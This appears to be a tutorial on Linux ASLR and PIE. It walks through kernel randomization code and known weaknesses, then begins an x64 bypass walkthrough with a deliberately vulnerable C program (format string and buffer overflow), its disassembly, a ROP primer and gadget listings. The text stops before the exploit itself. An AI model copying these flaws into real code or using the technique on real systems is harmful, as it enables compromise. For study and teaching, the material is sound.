## Preface
Hey there!
I'm finally ready to present you the third installment of the series *exploit mitigation techniques*.

The last two times we talked about [Data Execution Prevention](https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/) and [Stack Canaries](https://0x00sec.org/t/exploit-mitigation-techniques-stack-canaries/) 
Today I want to talk about Address Space Layout Randomization or ASLR in short.

Format wise the article will be structured the following way:

1. Introduction to the technique
2. Current implementation details
3. Weaknesses
4. PoC on how to bypass ASLR
5. Conclusion


> Disclaimer: The following is the result of a self study and might contain faulty information. If you find any let me know. Thanks!

---

## Requirements

   * A bunch of spare minutes
   * A basic understanding of what causes memory corruptions/information leaks
   * The will to ask or look up unknown terms yourself
   * ASM/C knowledge
   * x64 exploitation basics
   * return oriented programming basics
   * knowledge from my previous 2 installments



---
## Address Space Layout Randomization
### Basic Design
With DEP and canaries in place adversaries could not easily execute arbitrary inserted code in memory anymore.  
Memory pages, where buffer contents reside are marked non executable and the canary value prevents a simple overwrite of any return statement within a function.  
A problem that was still present and exploited was that executed processes had a static address mapping.  
That made it easy to find addresses of library functions or the run binary itself in memory.  
Ultimately leading to a successful arc injection attack without much effort.  

As a result address space layout randomization (ASLR) emerged to bring another security parameter to the table to deny adversaries easily guessable memory locations.  
The idea is to place objects randomly in the virtual address space causing a non trivial problem to solve for an attacker, which is the ability to execute placed malicious code at will.  
A very tl;dr version of ASLR would be that a random offset value is added to the base address during process creation to independently change all three areas of a process's address space, consisting of an executable, mapped and stacked area. 
In short the most exploited areas: the stack, the heap and the libraries are mapped randomly in memory to prevent abuse.  

Linux offers three different ASLR modes which are displayed below:
```
Linux ASLR can be configured through setting a value in /proc/sys/kernel/randomize_va_space.
Three types of flags are available

0 – No randomization. Everything is static.
1 – Conservative randomization. Shared libraries, stack, mmap(), VDSO and heap are randomized.
2 – Full randomization. In addition to elements listed in the previous point, memory managed through brk() is also randomized.
```

> Note:  "VDSO" (virtual dynamic shared object) is a small shared library that the kernel automatically maps into the address space of all user-space applications.

> Note 2: mmap() creates a new mapping in the virtual address space of the calling process.

> Note 3: brk() and sbrk() change the location of the program break, which defines the end of the process's data segment.

Beyond that Linux systems offer **position independent executable (PIE)** binaries, which hardens ASLR even more.  
PIE is an additional address space randomization technique that compiles and links executables to be fully position independent.  
The result is that binaries compiled that way have their *code segment*, their *global offset table (GOT)* and their *procedure linkage table (PLT)* placed at random locations within virtual memory each time the application is executed as well, leaving no more static locations.

                                                    Process Virtual Memory Mapping


                                First execution            Second Execution           Third Execution

                          +   +------------------+       +------------------+       +------------------+
                          |   |                  |       |                  |       |                  |
                          |   |                  |       +------------------+       |                  |
                          |   +------------------+       |   executable     |       |                  |
                          |   |   executable     |       |                  |       +------------------+
                          |   |                  |       +------------------+       |   executable     |
                          |   +------------------+       |                  |       |                  |
                          |   |                  |       |                  |       +------------------+
                          |   |                  |       +------------------+       |                  |
                          |   |                  |       |                  |       +------------------+
                          |   |                  |       |      heap        |       |                  |
                          |   +------------------+       |                  |       |      heap        |
                          |   |                  |       +------------------+       |                  |
                          |   |      heap        |       |                  |       +------------------+
                          |   |                  |       |                  |       |                  |
                          |   +------------------+       |                  |       |                  |
        Memory address    |   |   libraries      |       |                  |       +------------------+
        growth direction  |   |                  |       |                  |       |   libraries      |
                          |   +------------------+       |                  |       |                  |
                          |   |                  |       +------------------+       +------------------+
                          |   |                  |       |   libraries      |       |                  |
                          |   |                  |       |                  |       |                  |
                          |   |                  |       +------------------+       |                  |
                          |   |                  |       |                  |       +------------------+
                          |   |                  |       +------------------+       |                  |
                          |   |                  |       |                  |       |      Stack       |
                          |   +------------------+       |      Stack       |       |                  |
                          |   |                  |       |                  |       |                  |
                          |   |      Stack       |       |                  |       +------------------+
                          |   |                  |       +------------------+       |                  |
                          |   |                  |       |                  |       |                  |
                          |   +------------------+       |                  |       |                  |
                          |   |                  |       |                  |       |                  |
                          v   +------------------+       +------------------+       +------------------+


> Here you can see a *simple* overview on how a process can behave in memory after three successive executions

___
#### PIE detour

Let's talk about total position independency for a moment!  
To make a PIE binary work correctly we have to consider  that there needs to be a way for the loader  to resolve symbols at runtime.  
As the address of the symbol in memory is not a part of the main binary anymore the loader adds a level of indirection in the procedure linkage table (PLT).  
Instead of calling, lets say `puts()` directly, the .plt section of the binary contains a special entry that points to the loader.  
The loader then has to resolve the actual address of the function.  
Once it has done that it updates an entry in the Global Offset Table (GOT).  
Subsequent calls to the same routine are made by jumps from the GOT entry.  

> Trivia: The Linux command line program **file** detects PIE files as *dynamic shared objects (DSO)* instead of the usual *ELF file*.

PIE must be viewed as an addition to ASLR, since it would not do any good if there was no ASLR in the first place.  
That said since a PIE binary and all of its dependencies are loaded into random locations within virtual memory each time the application is executed return oriented programming (ROP) attacks are much more difficult to execute reliably.
__

Okay back to the main topic about ASLR!  
Linux based operating systems got a default ASLR implementation since kernel version 2.6.12, which was released in 2005, but got a set of patches to increase security by the PaX project later on.
But already in 2001 PaX published the first design and implementation of ASLR.
Only years later in 2014 with the release of kernel version 3.14 the possibility to enable kernel address space layout randomization (kASLR) was given, which has the same goal as ASLR, only with the idea in mind to randomize the kernel code location in memory when the system boots.  
Since kernel version 4.12 kASLR is enabled by default.  
The effectiveness of kASLR has been questioned quite a few times already and a variety of drawbacks are publicly known as of today.  
Non the less it adds a further hardening to the system and should not be dismissed that easily.  
 I have added some references at the end for anyone interested in kASLR exploitation :) .

> Side note: Windows machines on the other hand have ASLR and kASLR enabled by default since the launch of Windows Vista in 2006 and work similar, but due to the differences in system design nuances of differences exist and cannot be covered in this paper but looked up in a [detailed analysis](https://insights.sei.cmu.edu/cert/2014/02/differences-between-aslr-on-windows-and-linux.html) issued by the CERT Institute.

This makes clear that (k)ASLR and PIE solely rely on keeping the altered memory space secret to be effective.

----
### ASLR implementation - Diving into the Linux kernel

What would a research article look like if we didn't dig into the implementations ;) .  
The kernel is huge and truely a work of geniuses, as a result I will and can just scratch on the surface of the implementations for this article.  
This enables us to focus on the relevant parts and keep the article a reasonable length.  
Again remember, this will be all Linux specific, so please keep that in mind :) .

> Note: We will mostly take a look at the current x86 implementation. Comparing the following to the other implementations is another topic!

---
#### Randomizing a memory address

So first of all how does the system get a randomized memory address in the available/valid address range?  
Luckily the kernel code is open source and (mostly :D ) documented!  
Let's take a look at the [/drivers/char/random.c](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/drivers/char/random.c#l1342) kernel file that exactly handles our needs:

```c
/**
 * randomize_page - Generate a random, page aligned address
 * @start:	The smallest acceptable address the caller will take.
 * @range:	The size of the area, starting at @start, within which the
 *		random address must fall.
 *
 * If @start + @range would overflow, @range is capped.
 *
 * NOTE: Historical use of randomize_range, which this replaces, presumed that
 * @start was already page aligned.  We now align it regardless.
 *
 * Return: A page aligned address within [start, start + range).  On error,
 * @start is returned.
 */
unsigned long
randomize_page(unsigned long start, unsigned long range)
{
	if (!PAGE_ALIGNED(start)) {
		range -= PAGE_ALIGN(start) - start;
		start = PAGE_ALIGN(start);
	}

	if (start > ULONG_MAX - range)
		range = ULONG_MAX - start;

	range >>= PAGE_SHIFT;

	if (range == 0)
		return start;

	return start + (get_random_long() % range << PAGE_SHIFT);
}

```
Essentially what happens here is that in order to generate a random address `randomize_page()` takes two arguments: a start address and a range argument.  
After some initital page alignment magic what it ultimately comes down to is that it uses the `get_random_long()` function and applies a modulo to get a number between the suppiled 'start' address within the offered 'range' value.





-----
#### ELF binary loading



If the kernel is instructed to load an ELF binary a routine called `load_elf_binary()` is invoked.  
This one is located in [/fs/binfmt_elf.c](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/binfmt_elf.c).  
Here a multitude of things happen.  
Lets take a quick look at these parts, which are responsible for the initialization of pointers memory, like the code, data and stack section. 

```c
static int load_elf_binary(struct linux_binprm *bprm)
{
[...]
if (!(current->personality & ADDR_NO_RANDOMIZE) && randomize_va_space)
        current->flags |= PF_RANDOMIZE;
[...]
	/* Do this so that we can load the interpreter, if need be.  We will
	   change some of these later */
	retval = setup_arg_pages(bprm, randomize_stack_top(STACK_TOP),
				 executable_stack);
[...]
	/* N.B. passed_fileno might not be initialized? */
	current->mm->end_code = end_code;
	current->mm->start_code = start_code;
	current->mm->start_data = start_data;
	current->mm->end_data = end_data;
	current->mm->start_stack = bprm->p;

	if ((current->flags & PF_RANDOMIZE) && (randomize_va_space > 1)) {
		current->mm->brk = current->mm->start_brk =
			arch_randomize_brk(current->mm);
#ifdef compat_brk_randomized
		current->brk_randomized = 1;
```
We can see that if the `randomize_va_space` variable is higher than 1, and the `PF_RANDOMIZE` flag is set, the base address of `brk()` is randomized with the `arch_randomize_brk()` function.  
Furthermore the top of the stack gets some randomization treatment as well!






-----
####  brk() randomization


>    Recall: brk() changes the  location of the program break, which defines the end of the process's data segment (i.e., the program break
       is the first location after the end of the uninitialized data segment). Increasing the program break has the effect of allocating memory to  
       the process; decreasing the break deallocates memory.


The x86 implementation of the `randomize_brk()` function is located in [/arch/x86/kernel/process.c](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/x86/kernel/process.c): 

```c
unsigned long arch_randomize_brk(struct mm_struct *mm)
{
	return randomize_page(mm->brk, 0x02000000);
}
```
It randomizes the given address space by providing the current address with an additional range argument of `0x02000000` using the former `randomize_page()` routine!

-----
#### Stack randomization


The stack randomization is started in the  [/fs/binfmt_elf.c](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/binfmt_elf.c) as well.  
In particular in the `load_elf_binary()` we talked above already!

```c
static int load_elf_binary(struct linux_binprm *bprm)
{
[...]
	/* Do this so that we can load the interpreter, if need be.  We will
	   change some of these later */
	retval = setup_arg_pages(bprm, randomize_stack_top(STACK_TOP),
				 executable_stack);
[...]
```
In the end we have 2 components we have to take a look at here. First the `setup_arg_pages()` and then `randomize_stack_top()`.  
Let's start with the latter, since it's needed as a function argument for `setup_arg_pages()`:

```c
[...]
#ifndef STACK_RND_MASK
#define STACK_RND_MASK (0x7ff >> (PAGE_SHIFT - 12))	/* 8MB of VA */
#endif

static unsigned long randomize_stack_top(unsigned long stack_top)
{
	unsigned long random_variable = 0;

	if (current->flags & PF_RANDOMIZE) {
		random_variable = get_random_long();
		random_variable &= STACK_RND_MASK;
		random_variable <<= PAGE_SHIFT;
	}
#ifdef CONFIG_STACK_GROWSUP
	return PAGE_ALIGN(stack_top) + random_variable;
#else
	return PAGE_ALIGN(stack_top) - random_variable;
#endif
[...]
}
```
It takes the top of the stack as an address and returns a page aligned version of that address +/- some random variable.  
This random variable is obtained by calling `get_random_long()` and doing once again some further randomization by doing a bitwise AND (&=) assignment with a defined `STACK_RND_MASK` and an additional left shift AND (<<=) assignment with a variable `PAGE_SHIFT`.

Okay that was not all for the stack as we outlined just earlier..  
The actual stack randomization will take place in [/fs/exec.c](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/exec.c) and more specifically in the `setup_arg_pages()` routine:

```c
[...]
/*
 * Finalizes the stack vm_area_struct. The flags and permissions are updated,
 * the stack is optionally relocated, and some extra space is added.
 */
int setup_arg_pages(struct linux_binprm *bprm,
		    unsigned long stack_top,
		    int executable_stack)
[...]
#ifdef CONFIG_STACK_GROWSUP
	/* Limit stack size */
	stack_base = rlimit_max(RLIMIT_STACK);
	if (stack_base > STACK_SIZE_MAX)
		stack_base = STACK_SIZE_MAX;

	/* Add space for stack randomization. */
	stack_base += (STACK_RND_MASK << PAGE_SHIFT);

	/* Make sure we didn't let the argument array grow too large. */
	if (vma->vm_end - vma->vm_start > stack_base)
		return -ENOMEM;

	stack_base = PAGE_ALIGN(stack_top - stack_base);

	stack_shift = vma->vm_start - stack_base;
	mm->arg_start = bprm->p - stack_shift;
	bprm->p = vma->vm_end - stack_shift;
#else
	stack_top = arch_align_stack(stack_top);
	stack_top = PAGE_ALIGN(stack_top);

	if (unlikely(stack_top < mmap_min_addr) ||
	    unlikely(vma->vm_end - vma->vm_start >= stack_top - mmap_min_addr))
		return -ENOMEM;

	stack_shift = vma->vm_end - stack_top;

	bprm->p -= stack_shift;
	mm->arg_start = bprm->p;
#endif
[...]
```
If the stack segment does not grow upwards, the kernel will use `arch_align_stack()` to pass the stack top address, which was an argument of the current function we are looking at.  
Then it will align the returned value and continue further stack setup.  
The alignment procedure again can be found back in [/arch/x86/kernel/process.c](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/x86/kernel/process.c)

```c
unsigned long arch_align_stack(unsigned long sp)
{
	if (!(current->personality & ADDR_NO_RANDOMIZE) && randomize_va_space)
		sp -= get_random_int() % 8192;
	return sp & ~0xf;
}
```
If the currently executed task has no `ADDR_NO_RANDOMIZE` flag set and furthermore the `randomize_va_space` has a value besides 0 the `get_random_int()` function is invoked to perform the stack randomization.  
This happens in form of retrieving a random `int()` value and following up by a modulo (%) operation with 8192.  
After decrementing the stack pointer (sp) with the random number in case of an ASLR supported task, the talked about alignment takes place.  
On the x86 architecture it will align it by masking it with 0xfffffff0.  

-----
#### mmap() randomization

> Recall:  mmap()  creates a new mapping in the virtual address space of the calling process. It takes two arguments: a start address for the new mapping and the length of the mapping.

After performing some essential tests to avoid collisions with the randomized virtual address space of the stack the randomization routine for `mmap()` is started.  
We can find the essential pieces in [/arch/x86/mm/mmap.c](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/x86/mm/mmap.c):

```c
[...]
static unsigned long mmap_base(unsigned long rnd, unsigned long task_size)
{
	unsigned long gap = rlimit(RLIMIT_STACK);
	unsigned long pad = stack_maxrandom_size(task_size) + stack_guard_gap;
	unsigned long gap_min, gap_max;

	/* Values close to RLIM_INFINITY can overflow. */
	if (gap + pad > gap)
		gap += pad;

	/*
	 * Top of mmap area (just below the process stack).
	 * Leave an at least ~128 MB hole with possible stack randomization.
	 */
	gap_min = SIZE_128M;
	gap_max = (task_size / 6) * 5;

	if (gap < gap_min)
		gap = gap_min;
	else if (gap > gap_max)
		gap = gap_max;

	return PAGE_ALIGN(task_size - gap - rnd);
[...]
}
```
First some calculation of the maximum randomized address via `stack_maxrandom_size()` is done.  
We can see the routine itself already gets called with a `unsigned long rnd` parameter which is used to return a page aligned memory area, where the `rnd` is used as a factor.

The `rnd` variable is calculated and retrived beforehand from the `arch_rnd()` routine, which looks like:

```c
static unsigned long arch_rnd(unsigned int rndbits)
{
	if (!(current->flags & PF_RANDOMIZE))
		return 0;
	return (get_random_long() & ((1UL << rndbits) - 1)) << PAGE_SHIFT;
} 
```
After checking if randomization shall take places the routine consist of various metrics.  
The `rndbits` part depends on whether we have a 32-bit or 64-bit application.

> Note: 1UL represents am unsigned long int with a value of 1 represented at the bit level as: 00000000000000000000000000000001

In the end we have the value 1 as an unsigned long int datatype left shifted by the by the `rndbits` value.
This value is substracted by 1.
Next an AND operation on the binary level with the prior result is taking place.
This lastly gets left shifted by the value residing in `PAGE_SHIFT`.



So much for a brief overview of the linux kernel internals for now.  
Since the kernel is an ever evolving structure, things might be different in the near future, but the basic routines will most likely stay the same.  
Let's continue since we still have a lot more to talk about!  
Next up will be the talk about known ASLR limitations.  

----
#### Flashback: Data Execution Prevention 

> Recall: mprotect() changes protection for the calling process's memory page(s) containing any part of the address range in the interval 


Remember my first article about data execution prevention and non executable stacks :) ?

When skimming through the kernel code I found the code snippet responsible for making the stack (not) executable.
It was right below the stack randomization part in [/fs/exec.c](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/exec.c) :

```c
[...]
vm_flags = VM_STACK_FLAGS;

/*
 * Adjust stack execute permissions; explicitly enable for
 * EXSTACK_ENABLE_X, disable for EXSTACK_DISABLE_X and leave alone
 * (arch default) otherwise.
 */
if (unlikely(executable_stack == EXSTACK_ENABLE_X))
	vm_flags |= VM_EXEC;
else if (executable_stack == EXSTACK_DISABLE_X)
	vm_flags &= ~VM_EXEC;
vm_flags |= mm->def_flags;
vm_flags |= VM_STACK_INCOMPLETE_SETUP;

ret = mprotect_fixup(vma, &prev, vma->vm_start, vma->vm_end,
		vm_flags);
[...]
```
For those of you who are still interested: It uses a modified `mprotect()` routine which can be found in [/mm/mprotect.c](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/mm/mprotect.c).


-----
### Limitations

As good as ASLR sounds on paper it has multiple design flaws especially on 32 bit systems.  
Moreover multiple ways around ASLR have been found, which enables adversaries to still exploit applications only with a medium increase in workload in the exploit building phase.  
One of the most critical constraints on 32 bit systems is the fragmentation problem that limits the security design a lot.  
Objects are randomly mapped in memory, causing "chunks" of free memory in between mapped objects in the address space, which can also be seen in the ASLR graphics at the beginning.  
Eventually no big enough memory chunk to hold a new process can be found anymore.  
This is less of a problem of 64 bit systems due to increased size in virtual memory address space.  

ASLR relies on randomness applied to objects mapped in memory to be effective.   
Nevertheless keeping a relative distance to each object in memory is maintained to give growable objects like the stack or heap more freedom, while avoiding fragmentation.  
This method introduces a major flaw due to too low entropy values.  
On average a 16 bit entropy is present on 32 bit systems, which can be brute forced within minutes at most on current systems.  
64 bit systems have around 40 bit available for randomization, from which only around 28 bit can be effectively used for entropy measures, making them slightly more secure.  
This only matters as long as one cannot guess some bits due to information leaks or similar tactics.  

Furthermore it was observed that the random generator used by ASLR does not produce/was not producing a truly uniform mapping for all libraries on both architectures, so focusing on more likely addresses to hold mapped objects decreases the cost for a brute force attack even further.

Last but not least the fact that libraries are mapped next to each other in memory can be used for correlation attacks, since knowing one library address leaks the positions of all surrounding ones as well.  
That enabled an exploit tactic called [*Offset2lib*](http://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html).
There a buffer overflow is used to de-randomize an applications address space and fully abuse this.

Besides the aforementioned facts already known return to known code attacks like **ret2libc** or **return oriented programming** work as good as ever if one can find the right addresses to use.

Additionally for kASLR you have to note that gaining a certain pointer, which provides any kind of information about the process allocation in memory can be used to break this technique, since the kernel cannot change its distribution in memory throughout its operating time.  
This means that until the next system reboot a new randomization of kernel code in memory *will not* and more importantly *cannot* be performed!  
This fact makes kASLR weaker than its big brother ASLR, since the latter randomizes for every new spawning process.


> Note: binaries compiled without the PIE option are vulnerable even with a fully enabled ASLR present. This is the case, since an attacker could leverage the .text, .plt and .got segment within an executable. That said a valid attack type in this case is return2PLT/GOT or simply ROP!

-----
## Defeating ASLR, Stack Canaries and DEP as well as bypassing FULL RELRO on x64

Since ASLR does not bring anything new or fancy to the table and *just* randomizes the process address space of a given binary I thought we could just jump into x64 exploitation as well.

> Note: the last 2 articles only covered x86 binaries

### The vulnerable binary 

So let's get right into it:
The vulnerable program did not change much from last time.  
It was already build around being exploited with ASLR in mind ;)
Here is the code again:

```c
#include <stdio.h>
#include <string.h>

#define STDIN 0

void itIsJustASmallLeakSir() {
    char buf[512];
    scanf("%s", buf);
    printf(buf);
}

void trustMeIAmAnEngineer() {
    char buf[1024];
    read(STDIN, buf, 2048);
}

int main(int argc, char* argv[]) {
    printf("Welcome to how 2 not write Code 101");
    setbuf(stdout, NULL);
    printf("$> ");
    itIsJustASmallLeakSir();
    printf("\n");
    printf("$> ");
    trustMeIAmAnEngineer();

    printf("\nI reached the end!\n");

    return 0;

}
```
There are two obvious vulnerabilities at hand.  
One being a format string vulnerability in the `itIsJustASmallLeakSir()` function.
We do have full control of the buffer contents and our given input is printed without any checks.

The other one being a buffer overflow possibility in the  `trustMeIAmAnEngineer()` function.  
Here we can read in 2048 bytes into a buffer which just can hold half of that.

Let's compile it with `gcc -o vuln_x64 vuln.c -Wl,-z,relro,-z,now`.
Also let's enable full ASLR: `echo 2 > /proc/sys/kernel/randomize_va_space`

This results in a binary with the following exploit mitigations in place:

	$ checksec vuln_x64
	[*] '/home/lab/Git/RE_binaries/0x00sec/ASLR/binaries/vuln_x64'
	    Arch:     amd64-64-little
	    RELRO:    FULL RELRO
	    Stack:    Canary found
	    NX:       NX enabled
	    PIE:      No PIE (0x400000)
	    

The assembly did not change too much either obviously.
For the sake of completeness let's take a look again:

`main()`:  
```
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x0000000000400813 <+0>:	push   rbp
   0x0000000000400814 <+1>:	mov    rbp,rsp
   0x0000000000400817 <+4>:	sub    rsp,0x10
   0x000000000040081b <+8>:	mov    DWORD PTR [rbp-0x4],edi
   0x000000000040081e <+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000400822 <+15>:	mov    edi,0x400930			   ; string to be printed
   0x0000000000400827 <+20>:	mov    eax,0x0
   0x000000000040082c <+25>:	call   0x400620 <printf@plt>		   ; Welcome message is printed
   0x0000000000400831 <+30>:	mov    rax,QWORD PTR [rip+0x200830]        # 0x601068 <stdout@@GLIBC_2.2.5>
   0x0000000000400838 <+37>:	mov    esi,0x0
   0x000000000040083d <+42>:	mov    rdi,rax
   0x0000000000400840 <+45>:	call   0x400610 <setbuf@plt>
   0x0000000000400845 <+50>:	mov    edi,0x400954		           ; string to be printed
   0x000000000040084a <+55>:	mov    eax,0x0
   0x000000000040084f <+60>:	call   0x400620 <printf@plt>		   ; "$> "
   0x0000000000400854 <+65>:	mov    eax,0x0
   0x0000000000400859 <+70>:	call   0x400766 <itIsJustASmallLeakSir>	   ; function call
   0x000000000040085e <+75>:	mov    edi,0xa				   ; string to be printed "\n"
   0x0000000000400863 <+80>:	call   0x4005e0 <putchar@plt>		   ; "\n"
   0x0000000000400868 <+85>:	mov    edi,0x400954		           ; string to be printed
   0x000000000040086d <+90>:	mov    eax,0x0
   0x0000000000400872 <+95>:	call   0x400620 <printf@plt>	           ; "$> "
   0x0000000000400877 <+100>:	mov    eax,0x0
   0x000000000040087c <+105>:	call   0x4007c4 <trustMeIAmAnEngineer>	   ; function call
   0x0000000000400881 <+110>:	mov    edi,0x400958			   ; string to be printed
   0x0000000000400886 <+115>:	call   0x4005f0 <puts@plt>		   ; "\nI reached the end!\n"
   0x000000000040088b <+120>:	mov    eax,0x0
   0x0000000000400890 <+125>:	leave  
   0x0000000000400891 <+126>:	ret    
End of assembler dump.
```

`itIsJustASmallLeakSir()`  next.
```
gdb-peda$ disassemble itIsJustASmallLeakSir 
Dump of assembler code for function itIsJustASmallLeakSir:
   0x0000000000400766 <+0>:	push   rbp
   0x0000000000400767 <+1>:	mov    rbp,rsp
   0x000000000040076a <+4>:	sub    rsp,0x210
   0x0000000000400771 <+11>:	mov    rax,QWORD PTR fs:0x28		; stack canary right here
   0x000000000040077a <+20>:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000040077e <+24>:	xor    eax,eax
   0x0000000000400780 <+26>:	lea    rax,[rbp-0x210]			; stack setup
   0x0000000000400787 <+33>:	mov    rsi,rax
   0x000000000040078a <+36>:	mov    edi,0x400928
   0x000000000040078f <+41>:	mov    eax,0x0
   0x0000000000400794 <+46>:	call   0x400650 <__isoc99_scanf@plt>	; user input is read
   0x0000000000400799 <+51>:	lea    rax,[rbp-0x210]
   0x00000000004007a0 <+58>:	mov    rdi,rax				; user input is copied to rdi for printing
   0x00000000004007a3 <+61>:	mov    eax,0x0
   0x00000000004007a8 <+66>:	call   0x400620 <printf@plt>		; buf contents are printed
   0x00000000004007ad <+71>:	nop
   0x00000000004007ae <+72>:	mov    rax,QWORD PTR [rbp-0x8]		; stack canary check routine starts
   0x00000000004007b2 <+76>:	xor    rax,QWORD PTR fs:0x28
   0x00000000004007bb <+85>:	je     0x4007c2 <itIsJustASmallLeakSir+92>
   0x00000000004007bd <+87>:	call   0x400600 <__stack_chk_fail@plt>	; stack canary check failure
   0x00000000004007c2 <+92>:	leave  
   0x00000000004007c3 <+93>:	ret    										    ; return to main
End of assembler dump.
```

Lastly we take a look at `trustMeIAmAnEngineer()`
```
gdb-peda$ disassemble trustMeIAmAnEngineer 
Dump of assembler code for function trustMeIAmAnEngineer:
   0x00000000004007c4 <+0>:	push   rbp
   0x00000000004007c5 <+1>:	mov    rbp,rsp
   0x00000000004007c8 <+4>:	sub    rsp,0x410
   0x00000000004007cf <+11>:	mov    rax,QWORD PTR fs:0x28		; stack canary right here
   0x00000000004007d8 <+20>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004007dc <+24>:	xor    eax,eax
   0x00000000004007de <+26>:	lea    rax,[rbp-0x410]		        ; stack setup
   0x00000000004007e5 <+33>:	mov    edx,0x800
   0x00000000004007ea <+38>:	mov    rsi,rax
   0x00000000004007ed <+41>:	mov    edi,0x0
   0x00000000004007f2 <+46>:	mov    eax,0x0
   0x00000000004007f7 <+51>:	call   0x400630 <read@plt>		; user input is read
   0x00000000004007fc <+56>:	nop
   0x00000000004007fd <+57>:	mov    rax,QWORD PTR [rbp-0x8]		; stack canary check routine starts
   0x0000000000400801 <+61>:	xor    rax,QWORD PTR fs:0x28
   0x000000000040080a <+70>:	je     0x400811 <trustMeIAmAnEngineer+77>
   0x000000000040080c <+72>:	call   0x400600 <__stack_chk_fail@plt>	; stack canary check failure
   0x0000000000400811 <+77>:	leave  
   0x0000000000400812 <+78>:	ret    										    ; return to main
End of assembler dump.
gdb-peda$ 
```

___

As you can see, compared to last time, nothing much changed, except that it is a x64 binary this time around.  
All other parts should be known by now!

### 64-bit exploitation crash course

Let's do a really short introduction to x64 exploitation.  
My last two articles only covered x86 PoCs so let's step up the game a bit further.  
Not too much will change, but let's get everyone roughly on the same level before continuing.

#### Registers

In x86 we have 8 general purpose registers `eax, ebx, ecx, edx, ebp, esp, esi, edi`.  
On x64 these got extended to 64-bits ( prefix got changed from 'e' to 'r' ) and 8 other registers `r8, r9, r10, r11, r12, r13, r14, r15` got added.


#### Function arguments

According to the [Application Binary Interface (ABI)](https://raw.githubusercontent.com/wiki/hjl-tools/x86-psABI/x86-64-psABI-1.0.pdf), the first 6 integer or pointer arguments to a function are passed in registers.  
The first argument is placed in `rdi`, the second in `rsi`, the third in `rdx`, and then `rcx, r8 and r9`.  
Only the 7th argument and onwards are passed on the stack!   
`r10` is used as a static chain pointer in case of nested functions.

#### Extra: Return Oriented Programming (ROP) primer

The basic idea behind return oriented programming is that you chain together small 'gadgets'.  
A gadget is a short instruction sequence always ending with some kind of control flow manipulation to invoke the next gadget in the chain.  
Most of the times this is a simple `ret`.  
Once we execute a `ret`, the address of the next gadget off the stack is popped and control flow jumps to that address.  
In particular, ROP is useful for circumventing Address Space Layout Randomization and DEP to gain e.g. arbitrary code execution of some form.  

		
		                                            very basic ROP scheme
		
		                          +--------------------------------------------------+
		                          |                 process memory                   |
		                          +--------------------------------------------------+
		                          +--------------------------------------------------+
		                          |                                                  |
		                          |                    Stack                         |
		                          |                                                  |
		                          |                                                  |
		                          |            +-----------------------+             |
		                     +-----------------+  return address 3     <------------------------+
		                     |    |            +-----------------------+             |          |
		          +----------------------------+  return address 2     <-----------------+      |
		          |          |    |            +-----------------------+             |   |      |
		+--------------------------------------+  return address 1     |             |   |      |
		|         |          |    |            +-----------------------+ <---+ SP    |   |      |
		|         |          |    |                                                  |   |      |
		|         |          |    +--------------------------------------------------+   |      |
		|         |          |    |                                                  |   |      |
		|         |          |    |                                                  |   |      |
		|         |          |    |                                                  |   |      |
		|         |          |    |                                                  |   |      |
		|         |          |    |                                                  |   |      |
		|         |          |    +--------------------------------------------------+   |      |
		|         |          |    |                   Libraries                      |   |      |
		|         |          |    |                                                  |   |      |
		|         |          |    |      +----------------------------------+        |   |      |
		|         |          +----------->  instruction sequence; ret       +--------------------------> ...
		|         |               |      +----------------------------------+        |   |      |
		|         +---------------------->  instruction sequence; ret       +-------------------+
		|                         |      +----------------------------------+        |   |
		+-------------------------------->  instruction sequence; ret       +------------+
		                          |      +----------------------------------+        |
		                          +--------------------------------------------------+
		                          |                                                  |
		                          +--------------------------------------------------+
		                          |                      Code                        |
		                          +--------------------------------------------------+


> Note: If you want to get even more familiar with ROP check the challenge section of the forum. Multiple writeups of different complexity are waiting to be found.

We can find gadgets in numerous ways.  
The easiest way might be to use one of the already existing tools like [ropper](https://github.com/sashs/ropper).  
For our binary above the shortened output looks like:


```
$ ropper2 --file ./vuln_x64 
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%


Gadgets
=======

0x00000000004006c2: adc byte ptr [rax], ah; jmp rax; 
0x000000000040090f: add bl, dh; ret; 
0x0000000000400754: add byte ptr [rax - 0x7b], cl; sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax; 
0x000000000040090d: add byte ptr [rax], al; add bl, dh; ret; 
0x0000000000400752: add byte ptr [rax], al; add byte ptr [rax - 0x7b], cl; sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax; 
0x000000000040090b: add byte ptr [rax], al; add byte ptr [rax], al; add bl, dh; ret; 
[...]
0x0000000000400912: add byte ptr [rax], al; sub rsp, 8; add rsp, 8; ret; 
0x000000000040088e: add byte ptr [rax], al; leave; ret; 
0x000000000040088f: add cl, cl; ret; 
0x0000000000400734: add eax, 0x200936; add ebx, esi; ret; 
0x000000000040080b: add eax, 0xfffdefe8; dec ecx; ret; 
[...]
0x00000000004005bd: add rsp, 8; ret; 
0x0000000000400737: and byte ptr [rax], al; add ebx, esi; ret; 
0x0000000000400886: call 0x5f0; mov eax, 0; leave; ret; 
0x00000000004007bd: call 0x600; leave; ret; 
[...]
0x00000000004006d0: pop rbp; ret; 
0x0000000000400903: pop rdi; ret; 
0x0000000000400901: pop rsi; pop r15; ret; 
0x00000000004008fd: pop rsp; pop r13; pop r14; pop r15; ret; 
0x000000000040075a: push rbp; mov rbp, rsp; call rax; 
0x0000000000400757: sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax; 
0x0000000000400915: sub esp, 8; add rsp, 8; ret; 
0x0000000000400914: sub rsp, 8; add rsp, 8; ret; 
